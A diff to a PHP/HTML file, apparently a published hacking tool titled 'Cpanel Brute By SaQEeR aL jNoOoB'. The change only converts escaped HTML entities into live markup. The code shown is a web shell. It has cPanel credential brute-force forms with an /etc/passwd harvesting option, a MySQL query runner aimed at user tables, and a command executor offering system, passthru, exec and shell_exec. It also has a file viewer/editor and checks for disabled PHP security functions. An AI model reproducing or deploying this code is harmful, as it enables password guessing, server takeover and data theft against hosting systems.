@@ -490,176 +490,176 @@ if(isset($_POST['usernames']) && isset($_POST['passwords']))
 
 
 
-&lt;/head&gt;
+</head>
 
 
 
 
-&lt;form method="POST" target="_blank"&gt;
-	&lt;strong&gt;
-&lt;input name="page" type="hidden" value="find"&gt;        				
-    &lt;/strong&gt;
-    &lt;table width="748" border="0" cellpadding="3" cellspacing="1" align="center"&gt;
-    &lt;tr&gt;
-        &lt;td valign="top" bgcolor="#151515" height="67"&gt;&lt;center&gt;&lt;strong&gt;&lt;img src="http://im26.gulfup.com/2012-05-07/1336413453971.png" /&gt;&lt;br&gt;
-		&lt;/strong&gt;
-		&lt;a href="mailto:h1h@hotmail.be" class="style2"&gt;&lt;strong&gt;Cpanel Brute By SaQEeR aL jNoOoB&lt;/strong&gt;&lt;/a&gt;&lt;/center&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-    &lt;td&gt;
-    &lt;table width="109%" border="0" cellpadding="3" cellspacing="1" align="center"&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="310"&gt;
-	&lt;strong&gt;&lt;font size="4"&gt;User :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5" height="310"&gt;&lt;strong&gt;&lt;textarea cols="40" rows="10" name="usernames"&gt;&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="263"&gt;
-	&lt;strong&gt;&lt;font size="4"&gt;Pass :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5" height="263"&gt;&lt;strong&gt;&lt;textarea cols="40" rows="10" name="passwords"&gt;&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="28"&gt;
-	&lt;strong&gt;&lt;font size="4"&gt;Type :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5" height="28"&gt;
-    &lt;span class="style2"&gt;&lt;strong&gt;&lt;font size="4"&gt;Simple :&lt;/font&gt; &lt;/strong&gt; &lt;/span&gt;
-	&lt;strong&gt;
-	&lt;input type="radio" name="type" value="simple" checked="checked" class="style3"&gt;&lt;/strong&gt;
-    &lt;font class="style2"&gt;&lt;strong&gt;&lt;font size="4"&gt;/etc/passwd :&lt;/font&gt; &lt;/strong&gt; &lt;/font&gt;
-	&lt;strong&gt;
-	&lt;input type="radio" name="type" value="passwd" class="style3"&gt;&lt;/strong&gt;&lt;span class="style3"&gt;&lt;strong&gt;
-	&lt;/strong&gt;
-	&lt;/span&gt;
-    &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%" height="32"&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5" height="32"&gt;&lt;strong&gt;&lt;input type="submit" value="start"&gt;
-    &lt;/strong&gt;
-    &lt;/td&gt;
-    &lt;tr&gt;
-&lt;/form&gt;    
+<form method="POST" target="_blank">
+	<strong>
+<input name="page" type="hidden" value="find">        				
+    </strong>
+    <table width="748" border="0" cellpadding="3" cellspacing="1" align="center">
+    <tr>
+        <td valign="top" bgcolor="#151515" height="67"><center><strong><img src="http://im26.gulfup.com/2012-05-07/1336413453971.png" /><br>
+		</strong>
+		<a href="mailto:h1h@hotmail.be" class="style2"><strong>Cpanel Brute By SaQEeR aL jNoOoB</strong></a></center></td>
+    </tr>
+    <tr>
+    <td>
+    <table width="109%" border="0" cellpadding="3" cellspacing="1" align="center">
+    <td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="310">
+	<strong><font size="4">User :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5" height="310"><strong><textarea cols="40" rows="10" name="usernames"></textarea></strong></td>
+    </tr>
+    <tr>
+    <td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="263">
+	<strong><font size="4">Pass :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5" height="263"><strong><textarea cols="40" rows="10" name="passwords"></textarea></strong></td>
+    </tr>
+    <tr>
+    <td valign="top" bgcolor="#151515" class="style2" style="width: 19%" height="28">
+	<strong><font size="4">Type :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5" height="28">
+    <span class="style2"><strong><font size="4">Simple :</font> </strong> </span>
+	<strong>
+	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
+    <font class="style2"><strong><font size="4">/etc/passwd :</font> </strong> </font>
+	<strong>
+	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
+	</strong>
+	</span>
+    </td>
+    </tr>
+    <tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%" height="32"></td>
+    <td valign="top" bgcolor="#151515" colspan="5" height="32"><strong><input type="submit" value="start">
+    </strong>
+    </td>
+    <tr>
+</form>    
     
-    &lt;td valign="top" colspan="6" height="26" bgcolor="#151515"&gt;
-	&lt;p align="center"&gt;&lt;u&gt;&lt;b&gt;&lt;span id="result_box" class lang="en"&gt;
-	&lt;span class="hps"&gt;&lt;font size="4"&gt;If you&lt;/font&gt;&lt;/span&gt;&lt;font size="4"&gt;
-	&lt;span class="hps"&gt;want&lt;/span&gt; &lt;span class="hps"&gt;users to&lt;/span&gt;
-	&lt;span class="hps"&gt;the server&lt;/span&gt; &lt;span class="hps"&gt;at the end of&lt;/span&gt;
-	&lt;/font&gt;&lt;span class="hps"&gt;&lt;font size="4"&gt;script&lt;/font&gt;&lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;/u&gt;&lt;/td&gt;
+    <td valign="top" colspan="6" height="26" bgcolor="#151515">
+	<p align="center"><u><b><span id="result_box" class lang="en">
+	<span class="hps"><font size="4">If you</font></span><font size="4">
+	<span class="hps">want</span> <span class="hps">users to</span>
+	<span class="hps">the server</span> <span class="hps">at the end of</span>
+	</font><span class="hps"><font size="4">script</font></span></span></b></u></td>
 
-&lt;form method="POST" target="_blank"&gt;
-&lt;strong&gt;
-&lt;input type="hidden" name="go" value="cmd_mysql"&gt;
-    	&lt;/strong&gt;
-    	&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6" height="29"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;CMD MYSQL&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-    	&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%" height="29"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;user:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" height="29" width="17%"&gt;&lt;strong&gt;&lt;input name="mysql_l" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" height="29" width="10%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;pass:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" height="29" width="16%"&gt;&lt;strong&gt;&lt;input name="mysql_p" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" height="29" width="12%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;database:&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" height="29" width="20%"&gt;&lt;strong&gt;&lt;input name="mysql_db" type="text"&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-					&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="height: 25px; width: 19%;"&gt;
-	&lt;strong&gt;&lt;font size="4"&gt;cmd&lt;/font&gt;&lt;font size="4"&gt; :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5" style="height: 25px"&gt;
-	&lt;strong&gt;
-	&lt;textarea name="db_query" style="width: 353px; height: 89px"&gt;SHOW DATABASES;
+<form method="POST" target="_blank">
+<strong>
+<input type="hidden" name="go" value="cmd_mysql">
+    	</strong>
+    	<tr>
+    <td valign="top" bgcolor="#151515" class="style1" colspan="6" height="29"><strong>
+	<font size="4">CMD MYSQL</font></strong></td>
+    				</tr>
+    	<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%" height="29"><strong>
+	<font size="4">user:</font></strong></td>
+    <td valign="top" bgcolor="#151515" height="29" width="17%"><strong><input name="mysql_l" type="text"></strong></td>
+    <td valign="top" bgcolor="#151515" height="29" width="10%"><strong>
+	<font size="4">pass:</font></strong></td>
+    <td valign="top" bgcolor="#151515" height="29" width="16%"><strong><input name="mysql_p" type="text"></strong></td>
+    <td valign="top" bgcolor="#151515" height="29" width="12%"><strong>
+	<font size="4">database:</font></strong></td>
+    <td valign="top" bgcolor="#151515" height="29" width="20%"><strong><input name="mysql_db" type="text"></strong></td>
+    				</tr>
+					<tr>
+    <td valign="top" bgcolor="#151515" style="height: 25px; width: 19%;">
+	<strong><font size="4">cmd</font><font size="4"> :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5" style="height: 25px">
+	<strong>
+	<textarea name="db_query" style="width: 353px; height: 89px">SHOW DATABASES;
 SHOW TABLES user_vb ;
 SELECT * FROM user;
 SELECT version();
-SELECT user();&lt;/textarea&gt;&lt;/strong&gt;&lt;/td&gt;
-    	&lt;/tr&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="run"&gt;&lt;/strong&gt;&lt;/td&gt;
-    	&lt;/tr&gt;
-&lt;input name="db" value="MySQL" type="hidden"&gt;
-&lt;input name="db_server" type="hidden" value="localhost"&gt;
-&lt;input name="db_port" type="hidden" value="3306"&gt;
-&lt;input name="cccc" type="hidden" value="db_query"&gt;
+SELECT user();</textarea></strong></td>
+    	</tr>
+		<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%">&nbsp;</td>
+    <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="run"></strong></td>
+    	</tr>
+<input name="db" value="MySQL" type="hidden">
+<input name="db_server" type="hidden" value="localhost">
+<input name="db_port" type="hidden" value="3306">
+<input name="cccc" type="hidden" value="db_query">
     	
-&lt;/form&gt;    	
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="6"&gt;&nbsp;&lt;/td&gt;
+</form>    	
+		<tr>
+    <td valign="top" bgcolor="#151515" colspan="6">&nbsp;</td>
 
 
-		&lt;/tr&gt;
+		</tr>
 		
-&lt;form method="POST" target="_blank"&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;CMD 
-	system - passthru - exec - shell_exec&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;cmd :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
-					&lt;select name="att" dir="rtl"  size="1"&gt;
+<form method="POST" target="_blank">
+		<tr>
+    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>
+	<font size="4">CMD 
+	system - passthru - exec - shell_exec</font></strong></td>
+    				</tr>
+		<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%"><strong>
+	<font size="4">cmd :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5">
+					<select name="att" dir="rtl"  size="1">
 <?php
 if($_POST['att']==null)
 {
-echo '						&lt;option value="system" selected=""&gt;system&lt;/option&gt;';
+echo '						<option value="system" selected="">system</option>';
 }else{
-echo "						&lt;option value='$_POST[att]' selected=''&gt;$_POST[att]&lt;/option&gt;
-						&lt;option value=system&gt;system&lt;/option&gt;
+echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
+						<option value=system>system</option>
 ";
 
 						
 }
 ?>
 
-						&lt;option value="passthru"&gt;passthru&lt;/option&gt;
-						&lt;option value="exec"&gt;exec&lt;/option&gt;
-						&lt;option value="shell_exec"&gt;shell_exec&lt;/option&gt;
-					&lt;/select&gt;    
-    &lt;strong&gt;
-&lt;input name="page" type="hidden" value="ccmmdd"&gt;    
-	&lt;input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"&gt;&lt;/strong&gt;&lt;/td&gt;
-    	&lt;/tr&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="go"&gt;&lt;/strong&gt;&lt;/td&gt;
-    	&lt;/tr&gt;
-&lt;/form&gt;    	    	
+						<option value="passthru">passthru</option>
+						<option value="exec">exec</option>
+						<option value="shell_exec">shell_exec</option>
+					</select>    
+    <strong>
+<input name="page" type="hidden" value="ccmmdd">    
+	<input name="ccmmdd2" type="text" style="width: 284px" value="ls -la"></strong></td>
+    	</tr>
+		<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%">&nbsp;</td>
+    <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="go"></strong></td>
+    	</tr>
+</form>    	    	
 
-&lt;form method="POST" target="_blank"&gt;
+<form method="POST" target="_blank">
 
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;Show 
-	File And Edit&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;Path :&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
-	&lt;strong&gt;
-	&lt;input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"&gt;&lt;/strong&gt;&lt;/td&gt;
-    	&lt;/tr&gt;
-		&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&lt;strong&gt;&lt;input type="submit" value="show"&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-&lt;input name="page" type="hidden" value="show"&gt;        				
-&lt;/form&gt;    				
-					&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" class="style1" colspan="6"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;Info 
-	Security&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    				&lt;/tr&gt;
-    	&lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;Safe Mode&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
-	&lt;strong&gt;
+		<tr>
+    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>
+	<font size="4">Show 
+	File And Edit</font></strong></td>
+    				</tr>
+		<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%"><strong>
+	<font size="4">Path :</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5">
+	<strong>
+	<input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"></strong></td>
+    	</tr>
+		<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%">&nbsp;</td>
+    <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="show"></strong></td>
+    				</tr>
+<input name="page" type="hidden" value="show">        				
+</form>    				
+					<tr>
+    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>
+	<font size="4">Info 
+	Security</font></strong></td>
+    				</tr>
+    	<tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%"><strong>
+	<font size="4">Safe Mode</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5">
+	<strong>
 <?php
 $safe_mode = ini_get('safe_mode');
 if($safe_mode=='1')
@@ -670,61 +670,61 @@ echo 'OFF';
 }
 
 ?>	
-	&lt;/strong&gt;	
-	&lt;/td&gt;
-    				&lt;/tr&gt;
-    &lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&lt;strong&gt;
-	&lt;font size="4"&gt;Function&lt;/font&gt;&lt;/strong&gt;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;
-	&lt;strong&gt;
+	</strong>	
+	</td>
+    				</tr>
+    <tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%"><strong>
+	<font size="4">Function</font></strong></td>
+    <td valign="top" bgcolor="#151515" colspan="5">
+	<strong>
 <?php
 if(''==($func=@ini_get('disable_functions')))
 {
-echo "&lt;font color=#00800F&gt;No Security for Function&lt;/font&gt;&lt;/b&gt;";
+echo "<font color=#00800F>No Security for Function</font></b>";
 }else{
-echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
+echo "<font color=red>$func</font></b>";
 }
-?>&lt;/strong&gt;&lt;/td&gt;
-    &lt;tr&gt;
-    &lt;td valign="top" bgcolor="#151515" style="width: 19%"&gt;&nbsp;&lt;/td&gt;
-    &lt;td valign="top" bgcolor="#151515" colspan="5"&gt;&nbsp;&lt;/td&gt;
-    &lt;/table&gt;
-    &lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;/table&gt;
+?></strong></td>
+    <tr>
+    <td valign="top" bgcolor="#151515" style="width: 19%">&nbsp;</td>
+    <td valign="top" bgcolor="#151515" colspan="5">&nbsp;</td>
+    </table>
+    </td>
+    </tr>
+    </table>
 	
 	
 	
 	
-	&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8"></head><body></body></html>
 
 
 
 
 
-      &lt;form style="border: 0px ridge #FFFFFF"&gt;
+      <form style="border: 0px ridge #FFFFFF">
 
 
 
 
-    &lt;p align="center"&gt;&lt;/td&gt;
-  &lt;/tr&gt;&lt;div align="center"&gt;
+    <p align="center"></td>
+  </tr><div align="center">
 
-                &lt;tr&gt;
-
-
-
-&lt;input type="submit"   name="user" value="user"&gt;&lt;option value="name"&gt;&lt;/select&gt;
-&lt;/form&gt;
+                <tr>
 
 
-&lt;div align="center"&gt;
- &lt;table border="5" width="10%" bordercolorlight="#008000" bordercolordark="#006A00" height="100" cellspacing="5"&gt;
-&lt;tr&gt;
-&lt;td bordercolorlight="#008000" bordercolordark="#006A00"&gt;
-&lt;p align="left"&gt;
-&lt;textarea  method='POST' rows="25" name="S1" cols="16"&gt;
+
+<input type="submit"   name="user" value="user"><option value="name"></select>
+</form>
+
+
+<div align="center">
+ <table border="5" width="10%" bordercolorlight="#008000" bordercolordark="#006A00" height="100" cellspacing="5">
+<tr>
+<td bordercolorlight="#008000" bordercolordark="#006A00">
+<p align="left">
+<textarea  method='POST' rows="25" name="S1" cols="16">
 
 
 <?php
@@ -740,18 +740,18 @@ echo "&lt;font color=red&gt;$func&lt;/font&gt;&lt;/b&gt;";
 
 
 
-                                           for($uid=0;$uid&lt;90000;$uid++){
+                                           for($uid=0;$uid<90000;$uid++){
 
                                         }
 
 
 
 
-?>&lt;/textarea&gt;&lt;/table&gt;
-	&lt;strong&gt;
-	&lt;h3&gt;&lt;font size="6" color="#333333"&gt;&lt; Coded By SaQEeR aL jNoOoB &gt;&lt;/font&gt;&lt;/h3&gt;
-	&lt;/strong&gt;
-	&lt;p&gt;nbsp;
+?></textarea></table>
+	<strong>
+	<h3><font size="6" color="#333333">< Coded By SaQEeR aL jNoOoB ></font></h3>
+	</strong>
+	<p>nbsp;
 {% endhighlight %}
 
 
